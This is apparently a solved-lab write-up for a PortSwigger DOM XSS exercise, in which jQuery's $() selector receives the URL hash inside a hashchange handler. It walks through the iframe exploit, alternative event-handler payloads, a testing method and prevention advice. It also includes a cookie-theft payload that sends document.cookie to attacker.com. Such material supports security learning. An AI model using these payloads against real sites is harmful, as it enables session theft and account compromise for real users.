# DOM XSS in jQuery Selector Sink Using Hashchange Event

## Lab Overview
**Difficulty:** Apprentice  
**Vulnerability Type:** DOM-based Cross-Site Scripting (XSS)  
**Objective:** Deliver an exploit that calls `print()` function in victim's browser  
**Status:** ✅ Solved

---

## Understanding the Vulnerability

### The Vulnerable Code
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

### Code Breakdown
1. **Event Listener:** Listens for `hashchange` events (when URL hash changes)
2. **Source:** `window.location.hash.slice(1)` - Gets everything after `#` in URL
3. **Processing:** `decodeURIComponent()` - Decodes URL-encoded characters
4. **Sink:** jQuery `$()` selector function - **This is where the vulnerability is!**
5. **Intended Purpose:** Find an `<h2>` containing the hash text and scroll to it

---

## What Makes jQuery Selectors Dangerous?

jQuery's `$()` function has dual functionality:

### Normal Use - CSS Selector
```javascript
$('h2')                    // ✅ Finds h2 elements
$('.class-name')           // ✅ Finds elements by class
$('#id-name')              // ✅ Finds elements by ID
```

### Dangerous Use - HTML Creation
```javascript
$('<img src=x>')           // ⚠️ Creates an img element!
$('<img src=x onerror=alert(1)>')  // 💀 Creates AND executes JavaScript!
```

**The Problem:** When jQuery receives a string starting with `<`, it doesn't treat it as a selector—it **creates a new HTML element** and executes any event handlers!

---

## The Exploit Flow

### Step-by-Step Attack Process

1. **Attacker creates malicious URL:**
   ```
   https://vulnerable-site.net/#<img src=x onerror=print()>
   ```

2. **Victim visits the URL** (or loads it in iframe)

3. **The hash contains the payload:**
   ```javascript
   window.location.hash = "#<img src=x onerror=print()>"
   ```

4. **Hash change triggers the event:**
   ```javascript
   $(window).on('hashchange', function(){ ... })
   ```

5. **Payload gets injected into jQuery selector:**
   ```javascript
   $('section.blog-list h2:contains(<img src=x onerror=print()>)')
   ```

6. **jQuery creates the `<img>` element**

7. **Browser tries to load image from invalid source `x`**

8. **`onerror` event fires, executing `print()`**

9. **Print dialog appears! 🎉**

---

## The Solution - Creating the Exploit

### Challenge
We need to **deliver the exploit to the victim**, not just craft a URL. This requires:
- Hosting the exploit on the exploit server
- Using an iframe to load the vulnerable page
- Triggering the `hashchange` event programmatically

### The Working Exploit

```html
<iframe src="https://0a44001b0455e160807a03c500ca0038.web-security-academy.net/#" onload="if(!window.x){window.x=1;this.src+='<img src=x onerror=print()>'}">
</iframe>
```

### How This Exploit Works

#### 1. **Initial Load**
```html
<iframe src=".../#">
```
- Iframe loads the vulnerable page with just `#` in the hash
- This is the initial state (no payload yet)

#### 2. **The `onload` Trigger**
```javascript
onload="if(!window.x){window.x=1;this.src+='<img src=x onerror=print()>'}"
```

When the iframe finishes loading:
- **Check:** `if(!window.x)` - Prevents infinite loop (only runs once)
- **Set flag:** `window.x=1` - Marks that we've already executed
- **Modify URL:** `this.src+='<img src=x onerror=print()>'` - Appends payload to hash

#### 3. **Hash Change**
After the URL modification:
```
Before: https://.../#
After:  https://.../#<img src=x onerror=print()>
```

This URL change triggers the `hashchange` event!

#### 4. **Exploitation**
- `hashchange` event handler executes
- jQuery processes our payload
- `print()` function is called
- Lab is solved! ✅

---

## Step-by-Step Solution Process

### Step 1: Access the Exploit Server
Click **"Go to exploit server"** button on the lab page

### Step 2: Craft the Exploit
In the exploit server's **Body** section, paste:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="if(!window.x){window.x=1;this.src+='<img src=x onerror=print()>'}">
</iframe>
```

**Important:** Replace `YOUR-LAB-ID` with your actual lab ID!

### Step 3: Store the Exploit
Click the **"Store"** button to save your exploit

### Step 4: Test the Exploit
Click **"View exploit"** button
- A new tab should open
- The print dialog should appear immediately
- If it works, you're ready to deliver!

### Step 5: Deliver to Victim
Click **"Deliver exploit to victim"** button

### Step 6: Verify Success
The lab status should change to **"Solved"** ✅

---

## Alternative Payloads & Techniques

### Alternative Payload 1: Simpler Version (May work multiple times)
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**Pros:** Simpler code  
**Cons:** May trigger multiple times causing multiple print dialogs

### Alternative Payload 2: Using setTimeout (Most Reliable)
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"></iframe>
<script>
setTimeout(function(){
    window.frames[0].location = 'https://YOUR-LAB-ID.web-security-academy.net/#<img src=x onerror=print()>';
}, 500);
</script>
```

**Pros:** More reliable cross-browser, clear separation of concerns  
**Cons:** Slightly more complex

### Alternative HTML Elements
If `<img>` doesn't work, try:

```html
<!-- Using iframe with javascript: protocol -->
<iframe src=javascript:print()>

<!-- Using SVG -->
<svg onload=print()>

<!-- Using video tag -->
<video src=x onerror=print()>

<!-- Using audio tag -->
<audio src=x onerror=print()>

<!-- Using details element -->
<details open ontoggle=print()>
```

---

## Common Mistakes & Troubleshooting

### ❌ Mistake 1: Double Protocol
```html
<!-- WRONG -->
<iframe src="https://https://lab-id.web-security-academy.net/#">

<!-- CORRECT -->
<iframe src="https://lab-id.web-security-academy.net/#">
```

### ❌ Mistake 2: Extra Slashes Before Hash
```html
<!-- WRONG -->
<iframe src="https://lab-id.web-security-academy.net//#">

<!-- CORRECT -->
<iframe src="https://lab-id.web-security-academy.net/#">
```

### ❌ Mistake 3: Wrong Lab ID
Make sure you copy your actual lab ID from the URL bar, not the example!

### ❌ Mistake 4: Testing in Same-Origin Context
The exploit server must host the attack page. Don't try to test by manually changing the hash in the lab page URL.

---

## Why This Attack Works - Technical Deep Dive

### jQuery's `$()` Function Behavior

```javascript
// When jQuery sees a string starting with '<'
$('<img src=x onerror=alert(1)>')
```

jQuery's internal logic:
1. **Detects HTML:** Checks if string starts with `<` and ends with `>`
2. **Parses HTML:** Uses `parseHTML()` or similar method
3. **Creates DOM element:** Constructs the actual element
4. **Attaches event handlers:** Event attributes are parsed and attached
5. **Executes handlers:** When events trigger (like `onerror`), code runs
6. **Returns jQuery object:** Even if element isn't appended to DOM

### The `:contains()` Pseudo-Selector

```javascript
$('h2:contains(some text)')
```

- Finds all `<h2>` elements containing "some text"
- But if "some text" is actually HTML, jQuery processes it first!
- This is where our injection happens

### The Hash Change Event

```javascript
$(window).on('hashchange', function(){ ... })
```

Triggered when:
- User manually changes URL hash
- JavaScript modifies `window.location.hash`
- JavaScript modifies iframe's `src` with different hash
- User clicks back/forward button (if hash changes)

---

## Prevention Strategies

### For Developers

#### 1. **Never Pass User Input to jQuery Selectors**
```javascript
// ❌ DANGEROUS - Don't do this!
var userInput = window.location.hash.slice(1);
var element = $(userInput);

// ❌ Still dangerous even with concatenation
var element = $('h2:contains(' + userInput + ')');

// ✅ SAFE - Use attribute selectors with escaping
var safeInput = CSS.escape(userInput);
var element = $('[data-title="' + safeInput + '"]');
```

#### 2. **Sanitize Hash Values**
```javascript
// Remove potentially dangerous characters
var hashValue = window.location.hash.slice(1).replace(/[<>'"]/g, '');

// Or use allowlist approach
var hashValue = window.location.hash.slice(1).match(/^[a-zA-Z0-9-_]+$/);
```

#### 3. **Use Modern jQuery (3.x+)**
- jQuery 3.0+ has better protections against selector injection
- Update from older versions (1.x, 2.x)

#### 4. **Use `.filter()` Instead of `:contains()`**
```javascript
// Instead of this:
$('h2:contains(' + userInput + ')')

// Do this:
$('h2').filter(function() {
    return $(this).text() === userInput;
});
```

#### 5. **Implement Content Security Policy (CSP)**
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

### For Security Testers

#### What to Look For:
1. **jQuery usage** (check for `jquery.js` in page source)
2. **Hash-based functionality** (URLs with `#` being processed)
3. **Dynamic selectors** (user input in `$()` calls)
4. **Event handlers** on `hashchange`, `popstate`, `DOMContentLoaded`

#### Testing Methodology:
```javascript
// 1. Check jQuery version
$.fn.jquery  // In browser console

// 2. Test basic injection
https://target.com/#<img src=x onerror=alert(document.domain)>

// 3. Monitor console for errors
// 4. Try different payloads
// 5. Check if elements are created (inspect DOM)
```

---

## Key Security Concepts

| Concept | Explanation |
|---------|-------------|
| **Source** | `location.hash` - Attacker-controlled URL fragment |
| **Sink** | jQuery `$()` selector - Can create and execute HTML |
| **Event** | `hashchange` - Triggers when URL hash changes |
| **Payload** | `<img src=x onerror=print()>` - HTML with JS execution |
| **Delivery** | Iframe that loads page, then modifies hash |
| **Bypass** | jQuery doesn't sanitize HTML in selector strings |

---

## Attack Chain Summary

```
1. Victim loads attacker's page
   ↓
2. Page contains iframe with vulnerable site + initial hash
   ↓
3. Iframe loads, onload event fires
   ↓
4. JavaScript appends malicious payload to iframe's src hash
   ↓
5. Hash change triggers hashchange event in iframe
   ↓
6. Vulnerable code passes unsanitized hash to jQuery $()
   ↓
7. jQuery interprets hash as HTML, creates <img> element
   ↓
8. Image fails to load (invalid src), onerror fires
   ↓
9. print() function executes
   ↓
10. Lab solved! ✅
```

---

## Real-World Impact

### Severity: Medium to High

**Potential Attacks:**
- Cookie theft: `onerror=location='http://attacker.com?c='+document.cookie`
- Session hijacking: Steal authentication tokens
- Keylogging: Capture user input
- Phishing: Display fake login forms
- Defacement: Modify page content
- Clickjacking: Overlay malicious content

### Real-World Examples:
- Many WordPress plugins vulnerable to jQuery selector XSS
- Legacy applications using old jQuery versions
- Single-page applications with client-side routing

---

## References & Resources

- [PortSwigger: DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [jQuery Documentation: $() Function](https://api.jquery.com/jQuery/)
- [OWASP: DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [jQuery Source Code: parseHTML](https://github.com/jquery/jquery)
- [MDN: Window.location](https://developer.mozilla.org/en-US/docs/Web/API/Window/location)
- [MDN: hashchange Event](https://developer.mozilla.org/en-US/docs/Web/API/Window/hashchange_event)

---

## Practice Tips

1. **Understand jQuery versions:** Different versions have different behaviors
2. **Test hash changes:** Use browser console to test `window.location.hash`
3. **Monitor events:** Use `addEventListener` to see when events fire
4. **Inspect DOM:** Check if your payload creates elements
5. **Read source code:** Always examine the JavaScript handling user input

---

**Date Completed:** February 2, 2026  
**Working Exploit:**
```html
<iframe src="https://0a44001b0455e160807a03c500ca0038.web-security-academy.net/#" onload="if(!window.x){window.x=1;this.src+='<img src=x onerror=print()>'}">
</iframe>
```
**Key Technique:** jQuery selector injection via hashchange event with iframe-based delivery
